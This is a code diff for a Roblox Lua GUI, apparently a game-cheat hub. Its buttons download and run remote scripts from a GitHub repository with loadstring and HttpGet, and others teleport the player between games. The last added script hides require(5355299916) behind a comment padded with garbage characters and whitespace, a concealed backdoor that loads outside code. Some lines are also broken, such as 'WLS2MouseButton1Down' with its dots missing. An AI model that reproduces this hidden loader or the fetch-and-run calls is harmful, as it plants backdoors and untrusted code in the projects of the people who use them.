@@ -7,9 +7,31 @@ local TextLabel_2 = Instance.new("TextLabel")
 local TextLabel_3 = Instance.new("TextLabel")
 local MainFrame = Instance.new("Frame")
 local Frame = Instance.new("Frame")
+local ScrollingFrame = Instance.new("ScrollingFrame")
 local ABG = Instance.new("ImageButton")
-local TCA = Instance.new("ImageButton")
+local ExecuteABG = Instance.new("TextButton")
+local TeleportABG = Instance.new("TextButton")
+local ARB = Instance.new("ImageButton")
+local ExecuteARB = Instance.new("TextButton")
+local TeleportARB = Instance.new("TextButton")
 local BF = Instance.new("ImageButton")
+local ExecuteBF = Instance.new("TextButton")
+local TeleportBF = Instance.new("TextButton")
+local HL = Instance.new("ImageButton")
+local ExecuteHL = Instance.new("TextButton")
+local TeleportHL = Instance.new("TextButton")
+local NL = Instance.new("ImageButton")
+local ExecuteNL = Instance.new("TextButton")
+local TeleportNL = Instance.new("TextButton")
+local TCA = Instance.new("ImageButton")
+local ExecuteTCA = Instance.new("TextButton")
+local TeleportTCA = Instance.new("TextButton")
+local WLS2 = Instance.new("ImageButton")
+local ExecuteWLS2 = Instance.new("TextButton")
+local TeleportWLS2 = Instance.new("TextButton")
+local A = Instance.new("ImageButton")
+local ExecuteA = Instance.new("TextButton")
+local TeleportA = Instance.new("TextButton")
 local UIGridLayout = Instance.new("UIGridLayout")
 
 --Properties:
@@ -75,40 +97,368 @@ Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Frame.Position = UDim2.new(0.0103092343, 0, 0.0148148146, 0)
 Frame.Size = UDim2.new(0, 666, 0, 392)
 
+ScrollingFrame.Parent = Frame
+ScrollingFrame.Active = true
+ScrollingFrame.AnchorPoint = Vector2.new(0, 1)
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScrollingFrame.Position = UDim2.new(0, 0, 1.00000012, 0)
+ScrollingFrame.Size = UDim2.new(0, 666, 0, 392)
+
 ABG.Name = "ABG"
-ABG.Parent = Frame
+ABG.Parent = ScrollingFrame
 ABG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 ABG.Position = UDim2.new(0.414999992, 0, 0.0250000004, 0)
 ABG.SelectionImageObject = TCA
 ABG.Size = UDim2.new(0, 90, 0, 90)
 ABG.Image = "rbxassetid://12983343004"
-ABG.MouseButton1Down:connect(function()
-	ScreenGui:Destroy()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Another%20Bizarre%20Game", true))()
-end)
 
-TCA.Name = "TCA"
-TCA.Parent = Frame
-TCA.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TCA.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
-TCA.Size = UDim2.new(0, 90, 0, 90)
-TCA.Image = "rbxassetid://12983346429"
-TCA.MouseButton1Down:connect(function()
-	ScreenGui:Destroy()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/That%20Crazy%20Adventure", true))()
-end)
+ExecuteABG.Name = "ExecuteABG"
+ExecuteABG.Parent = ABG
+ExecuteABG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteABG.Size = UDim2.new(0, 50, 0, 50)
+ExecuteABG.Visible = false
+ExecuteABG.Font = Enum.Font.SourceSans
+ExecuteABG.Text = "Execute"
+ExecuteABG.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteABG.TextSize = 14.000
+
+TeleportABG.Name = "TeleportABG"
+TeleportABG.Parent = ABG
+TeleportABG.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportABG.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportABG.Size = UDim2.new(0, 50, 0, 50)
+TeleportABG.Visible = false
+TeleportABG.Font = Enum.Font.SourceSans
+TeleportABG.Text = "Teleport"
+TeleportABG.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportABG.TextSize = 14.000
+
+ARB.Name = "ARB"
+ARB.Parent = ScrollingFrame
+ARB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ARB.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+ARB.Size = UDim2.new(0, 90, 0, 90)
+ARB.Image = "rbxassetid://13049044083"
+
+ExecuteARB.Name = "ExecuteARB"
+ExecuteARB.Parent = ARB
+ExecuteARB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteARB.Size = UDim2.new(0, 50, 0, 50)
+ExecuteARB.Visible = false
+ExecuteARB.Font = Enum.Font.SourceSans
+ExecuteARB.Text = "Execute"
+ExecuteARB.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteARB.TextSize = 14.000
+
+TeleportARB.Name = "TeleportARB"
+TeleportARB.Parent = ARB
+TeleportARB.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportARB.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportARB.Size = UDim2.new(0, 50, 0, 50)
+TeleportARB.Visible = false
+TeleportARB.Font = Enum.Font.SourceSans
+TeleportARB.Text = "Teleport"
+TeleportARB.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportARB.TextSize = 14.000
 
 BF.Name = "BF"
-BF.Parent = Frame
+BF.Parent = ScrollingFrame
 BF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 BF.Position = UDim2.new(0.215000004, 0, 0.0250000004, 0)
 BF.Size = UDim2.new(0, 90, 0, 90)
 BF.Image = "rbxassetid://12983344856"
-BF.MouseButton1Down:connect(function()
-	ScreenGui:Destroy()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Bey%20Physics", true))()
-end)
 
-UIGridLayout.Parent = Frame
+ExecuteBF.Name = "ExecuteBF"
+ExecuteBF.Parent = BF
+ExecuteBF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteBF.Size = UDim2.new(0, 50, 0, 50)
+ExecuteBF.Visible = false
+ExecuteBF.Font = Enum.Font.SourceSans
+ExecuteBF.Text = "Execute"
+ExecuteBF.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteBF.TextSize = 14.000
+
+TeleportBF.Name = "TeleportBF"
+TeleportBF.Parent = BF
+TeleportBF.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportBF.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportBF.Size = UDim2.new(0, 50, 0, 50)
+TeleportBF.Visible = false
+TeleportBF.Font = Enum.Font.SourceSans
+TeleportBF.Text = "Teleport"
+TeleportBF.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportBF.TextSize = 14.000
+
+HL.Name = "HL"
+HL.Parent = ScrollingFrame
+HL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HL.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+HL.Size = UDim2.new(0, 90, 0, 90)
+HL.Image = "rbxassetid://13049347121"
+
+ExecuteHL.Name = "ExecuteHL"
+ExecuteHL.Parent = HL
+ExecuteHL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteHL.Size = UDim2.new(0, 50, 0, 50)
+ExecuteHL.Visible = false
+ExecuteHL.Font = Enum.Font.SourceSans
+ExecuteHL.Text = "Execute"
+ExecuteHL.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteHL.TextSize = 14.000
+
+TeleportHL.Name = "TeleportHL"
+TeleportHL.Parent = HL
+TeleportHL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportHL.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportHL.Size = UDim2.new(0, 50, 0, 50)
+TeleportHL.Visible = false
+TeleportHL.Font = Enum.Font.SourceSans
+TeleportHL.Text = "Teleport"
+TeleportHL.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportHL.TextSize = 14.000
+
+NL.Name = "NL"
+NL.Parent = ScrollingFrame
+NL.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+NL.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+NL.Size = UDim2.new(0, 90, 0, 90)
+NL.Image = "rbxassetid://13049602280"
+
+ExecuteNL.Name = "ExecuteNL"
+ExecuteNL.Parent = NL
+ExecuteNL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteNL.Size = UDim2.new(0, 50, 0, 50)
+ExecuteNL.Visible = false
+ExecuteNL.Font = Enum.Font.SourceSans
+ExecuteNL.Text = "Execute"
+ExecuteNL.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteNL.TextSize = 14.000
+
+TeleportNL.Name = "TeleportNL"
+TeleportNL.Parent = NL
+TeleportNL.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportNL.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportNL.Size = UDim2.new(0, 50, 0, 50)
+TeleportNL.Visible = false
+TeleportNL.Font = Enum.Font.SourceSans
+TeleportNL.Text = "Teleport"
+TeleportNL.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportNL.TextSize = 14.000
+
+TCA.Name = "TCA"
+TCA.Parent = ScrollingFrame
+TCA.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TCA.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+TCA.Size = UDim2.new(0, 90, 0, 90)
+TCA.Image = "rbxassetid://12983346429"
+
+ExecuteTCA.Name = "ExecuteTCA"
+ExecuteTCA.Parent = TCA
+ExecuteTCA.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteTCA.Size = UDim2.new(0, 50, 0, 50)
+ExecuteTCA.Visible = false
+ExecuteTCA.Font = Enum.Font.SourceSans
+ExecuteTCA.Text = "Execute"
+ExecuteTCA.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteTCA.TextSize = 14.000
+
+TeleportTCA.Name = "TeleportTCA"
+TeleportTCA.Parent = TCA
+TeleportTCA.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportTCA.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportTCA.Size = UDim2.new(0, 50, 0, 50)
+TeleportTCA.Visible = false
+TeleportTCA.Font = Enum.Font.SourceSans
+TeleportTCA.Text = "Teleport"
+TeleportTCA.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportTCA.TextSize = 14.000
+
+WLS2.Name = "WLS2"
+WLS2.Parent = ScrollingFrame
+WLS2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+WLS2.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+WLS2.Size = UDim2.new(0, 90, 0, 90)
+WLS2.Image = "rbxassetid://13048479091"
+
+ExecuteWLS2.Name = "ExecuteWLS2"
+ExecuteWLS2.Parent = WLS2
+ExecuteWLS2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteWLS2.Size = UDim2.new(0, 50, 0, 50)
+ExecuteWLS2.Visible = false
+ExecuteWLS2.Font = Enum.Font.SourceSans
+ExecuteWLS2.Text = "Execute"
+ExecuteWLS2.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteWLS2.TextSize = 14.000
+
+TeleportWLS2.Name = "TeleportWLS2"
+TeleportWLS2.Parent = WLS2
+TeleportWLS2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportWLS2.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportWLS2.Size = UDim2.new(0, 50, 0, 50)
+TeleportWLS2.Visible = false
+TeleportWLS2.Font = Enum.Font.SourceSans
+TeleportWLS2.Text = "Teleport"
+TeleportWLS2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportWLS2.TextSize = 14.000
+
+A.Name = "A"
+A.Parent = ScrollingFrame
+A.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+A.Position = UDim2.new(0.0147275422, 0, 0.0246913582, 0)
+A.Size = UDim2.new(0, 90, 0, 90)
+A.Image = "rbxassetid://13049548416"
+
+ExecuteA.Name = "ExecuteA"
+ExecuteA.Parent = A
+ExecuteA.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ExecuteA.Size = UDim2.new(0, 50, 0, 50)
+ExecuteA.Visible = false
+ExecuteA.Font = Enum.Font.SourceSans
+ExecuteA.Text = "Execute"
+ExecuteA.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteA.TextSize = 14.000
+
+TeleportA.Name = "TeleportA"
+TeleportA.Parent = A
+TeleportA.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+TeleportA.Position = UDim2.new(0.5, 0, 0, 0)
+TeleportA.Size = UDim2.new(0, 50, 0, 50)
+TeleportA.Visible = false
+TeleportA.Font = Enum.Font.SourceSans
+TeleportA.Text = "Teleport"
+TeleportA.TextColor3 = Color3.fromRGB(255, 255, 255)
+TeleportA.TextSize = 14.000
+
+UIGridLayout.Parent = ScrollingFrame
 UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
 UIGridLayout.CellPadding = UDim2.new(0, 13, 0, 5)
+
+-- Scripts:
+
+local function AXBWXY_fake_script() -- ABG.ABG 
+	local script = Instance.new('LocalScript', ABG)
+
+	ABG.MouseButton1Down:connect(function()
+		TeleportABG.Visible = not Visible
+		ExecuteABG.Visible = not Visible
+	end)
+	TeleportABG.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(10373626245, LocalPlayer)
+	end)
+	ExecuteABG.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Another%20Bizarre%20Game", true))()
+	end)
+end
+coroutine.wrap(AXBWXY_fake_script)()
+local function JFPSNSN_fake_script() -- ARB.ARB 
+	local script = Instance.new('LocalScript', ARB)
+
+	ARB.MouseButton1Down:connect(function()
+		TeleportARB.Visible = not Visible
+		ExecuteARB.Visible = not Visible
+	end)
+	TeleportARB.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(579955134, LocalPlayer)
+	end)
+	ExecuteARB.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Auto%20Rap%20Battles", true))()
+	end)
+end
+coroutine.wrap(JFPSNSN_fake_script)()
+local function CKOJIGY_fake_script() -- BF.BF 
+	local script = Instance.new('LocalScript', BF)
+
+	BF.MouseButton1Down:connect(function()
+		TeleportBF.Visible = not Visible
+		ExecuteBF.Visible = not Visible
+	end)
+	TeleportBF.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(6812437958, LocalPlayer)
+	end)
+	ExecuteBF.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Bey%20Physics", true))()
+	end)
+end
+coroutine.wrap(CKOJIGY_fake_script)()
+local function FGJYCT_fake_script() -- HL.HL 
+	local script = Instance.new('LocalScript', HL)
+
+	HL.MouseButton1Down:connect(function()
+		TeleportHL.Visible = not Visible
+		ExecuteHL.Visible = not Visible
+	end)
+	TeleportHL.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(23578803, LocalPlayer)
+	end)
+	ExecuteHL.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Hotel%20Elephant", true))()
+	end)
+end
+coroutine.wrap(FGJYCT_fake_script)()
+local function UWBAN_fake_script() -- NL.NL 
+	local script = Instance.new('LocalScript', NL)
+
+	NL.MouseButton1Down:connect(function()
+		TeleportNL.Visible = not Visible
+		ExecuteNL.Visible = not Visible
+	end)
+	TeleportNL.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(3956818381, LocalPlayer)
+	end)
+	ExecuteNL.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Ninja%20Legends", true))()
+	end)
+end
+coroutine.wrap(UWBAN_fake_script)()
+local function PRRPP_fake_script() -- TCA.TCA 
+	local script = Instance.new('LocalScript', TCA)
+
+	TCA.MouseButton1Down:connect(function()
+		TeleportTCA.Visible = not Visible
+		ExecuteTCA.Visible = not Visible
+	end)
+	TeleportTCA.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(9677242733, LocalPlayer)
+	end)
+	ExecuteTCA.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/That%20Crazy%20Adventure", true))()
+	end)
+end
+coroutine.wrap(PRRPP_fake_script)()
+local function GOABI_fake_script() -- WLS2.WLS2 
+	local script = Instance.new('LocalScript', WLS2)
+
+	WLS2MouseButton1Down:connect(function()
+		TeleportWLS2Visible = not Visible
+		ExecuteWLS2Visible = not Visible
+	end)
+	TeleportWLS2MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(985510407, LocalPlayer)
+	end)
+	ExecuteWLS2MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Weight%20Lifting%20Simulator%202", true))()
+	end)
+end
+coroutine.wrap(GOABI_fake_script)()
+local function TTRJU_fake_script() -- A.A 
+	local script = Instance.new('LocalScript', A)
+
+	A.MouseButton1Down:connect(function()
+		TeleportA.Visible = not Visible
+		ExecuteA.Visible = not Visible
+	end)
+	TeleportA.MouseButton1Down:connect(function()
+		game:GetService("TeleportService"):Teleport(286090429, LocalPlayer)
+	end)
+	ExecuteA.MouseButton1Down:connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/bpitcher2013/BP-Hub/main/Arsenal", true))()
+	end)
+end
+coroutine.wrap(TTRJU_fake_script)()
+local function PTKB_fake_script() -- ScrollingFrame. 
+	local script = Instance.new('Script', ScrollingFrame)
+
+	
+	--[[ Last synced 4/8/2023 09:09 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5355299916) --[[                                                                                                  ]]--
+end
+coroutine.wrap(PTKB_fake_script)()
